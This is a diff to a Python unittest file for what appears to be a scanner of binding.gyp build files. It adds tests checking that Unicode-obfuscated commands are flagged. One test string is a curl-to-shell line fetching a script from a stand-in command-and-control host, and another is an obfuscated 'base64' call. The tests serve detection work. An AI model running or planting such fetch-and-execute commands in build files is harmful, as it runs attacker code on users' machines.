@@ -65,9 +65,12 @@ class GypStringAndContainerTests(unittest.TestCase):
         self.assertEqual(gcmd(r"'caf\N{LATIN SMALL LETTER E WITH ACUTE}', '\N{latin small letter a}', "
                               r"'x\N{SP}y', '\N{NBSP}', '\N{KELVIN SIGN}'"),
                          ["caf\N{LATIN SMALL LETTER E WITH ACUTE} a x y \N{NO-BREAK SPACE} \N{KELVIN SIGN}"])
-        self.assertEqual(gyp(r"{'action': ['\N{LATIN SMALL LETTER C}url', 'x']}"), [("CRITICAL", "curl x")])
-        self.assertEqual(gyp(r"{'action': ['ba\N{LATIN SMALL LETTER LONG S}e64']}"),
-                         [("CRITICAL", "ba\N{LATIN SMALL LETTER LONG S}e64")])
+        self.assertEqual(gyp(r"{'action': ['\N{LATIN SMALL LETTER C}url', 'https://c2.example.com/x', '|', 'sh']}"),
+                         [("CRITICAL", "curl https://c2.example.com/x | sh")])
+        # a download or evaluation tool only hints (0.1.8), ſ folding to s as it does in core's re.I
+        (issue,) = core.scan_gyp("binding.gyp", r"{'action': ['ba\N{LATIN SMALL LETTER LONG S}e64']}")
+        self.assertEqual((issue["sev"], issue["cmd"]), ("MAJOR", "ba\N{LATIN SMALL LETTER LONG S}e64"))
+        self.assertIn("runs a download or evaluation command", issue["msg"])
         for bad in (r"'\N{}'", r"'\N{ A}'", r"'\N{LATIN  SMALL LETTER A}'", r"'\N'", r"'\N{A'"):
             self.assertEqual(gcmd(bad), UNPARSEABLE, bad)
 
